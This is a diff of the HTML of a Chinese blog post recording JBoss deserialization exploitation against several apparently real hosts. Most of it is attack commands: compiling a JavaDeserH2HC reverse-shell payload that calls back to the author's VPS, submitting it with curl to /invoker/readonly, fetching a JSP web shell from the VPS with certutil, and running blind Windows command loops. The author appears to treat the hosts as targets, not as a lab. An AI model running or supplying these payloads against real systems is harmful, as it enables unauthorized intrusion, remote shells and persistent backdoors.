@@ -28,7 +28,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95&#x2F;12.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95&#x2F;13.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95&#x2F;14.png">
-<meta property="og:updated_time" content="2020-01-21T06:42:34.109Z">
+<meta property="og:updated_time" content="2020-02-10T03:24:20.971Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95&#x2F;1.png">
   
@@ -207,28 +207,40 @@
 <p>无法创建用户</p>
 <p>kali安装JavaDeserH2HC 工具</p>
 <p>所用命令编译</p>
-<p>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</p>
+<ul>
+<li>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</li>
+</ul>
 <p>编译完成后会生成文件</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/4.png" alt="img"></p>
-<p>java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap vps服务器地址:7300</p>
+<ul>
+<li>java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap vps服务器地址:7300</li>
+</ul>
 <p>反弹到公网服务器IP上</p>
 <p>公网服务器监听</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/6.png" alt="img"></p>
 <p>kail执行 向目标主机提交 ser文件</p>
-<p>curl <a href="http://xxx.xxx.xxx.xxx:8888/invoker/readonly" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:8888/invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser</p>
+<ul>
+<li>curl <a href="http://xxx.xxx.xxx.xxx:8888/invoker/readonly" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:8888/invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/7.png" alt="img"></p>
 <p>- - 反弹成功 但是还是失连了</p>
 <p>换个目标试试</p>
 <p>这台linux弹过来了</p>
-<p>curl <a href="http://xxx.xxx.xxx.xxx:9090//invoker/readonly" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:9090//invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser</p>
+<ul>
+<li>curl <a href="http://xxx.xxx.xxx.xxx:9090//invoker/readonly" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:9090//invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser</li>
+</ul>
 <p>使用工具写入了一句话 无法连接</p>
 <p>查找文件写入位置</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/8.png" alt="img"></p>
-<p>find /home/ussdapp/neware-ussd/jboss-5.1.0.GA -name August.jsp -print</p>
+<ul>
+<li>find /home/ussdapp/neware-ussd/jboss-5.1.0.GA -name August.jsp -print</li>
+</ul>
 <p>麻蛋 换了一个菜刀就连上了</p>
 <p><img src="C:%5CUsers%5C86135%5CDesktop%5Cblog%E6%96%87%E6%A1%A3%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%5CJboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95%5C9.png" alt="img"></p>
 <p>只能命令执行盲写</p>
-<p>for /f %i in (‘dir /s /a:d /b d:^|findstr WEB-INF^|findstr docs’) do (echo %i &gt; %i..\4e46.txt)</p>
+<ul>
+<li>for /f %i in (‘dir /s /a:d /b d:^|findstr WEB-INF^|findstr docs’) do (echo %i &gt; %i..\4e46.txt)</li>
+</ul>
 <p>搞另外一个</p>
 <p><a href="http://xx.xxx.xxx.xxx:8888/" target="_blank" rel="noopener">http://xx.xxx.xxx.xxx:8888/</a></p>
 <p>命令执行软件有问题 使用</p>
@@ -238,13 +250,19 @@
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/12.png" alt="img"></p>
 <p>路径查看</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/13.png" alt="img"></p>
-<p>dir d:\exlive\gserver\jboss-5.1.0\server\default\deploy\management\shellinvoker.war\</p>
+<ul>
+<li>dir d:\exlive\gserver\jboss-5.1.0\server\default\deploy\management\shellinvoker.war\</li>
+</ul>
 <p>写入木马</p>
-<p>certutil.exe -urlcache -split -f <a href="http://vps服务IP:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务IP:8000/shell.jsp</a>   无连接建立</p>
+<ul>
+<li>certutil.exe -urlcache -split -f <a href="http://vps服务IP:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务IP:8000/shell.jsp</a>   无连接建立</li>
+</ul>
 <p>xxxx.ceye.io 可以外连</p>
 <p>泡别人马子也不行 - - </p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/14.png" alt="img"></p>
-<p>for /f %i in (‘dir /s /a:d /b d:^|findstr deploy^|findstr docs’) do (echo %i &gt; %i..\4e46.txt)</p>
+<ul>
+<li>for /f %i in (‘dir /s /a:d /b d:^|findstr deploy^|findstr docs’) do (echo %i &gt; %i..\4e46.txt)</li>
+</ul>
 
       
 
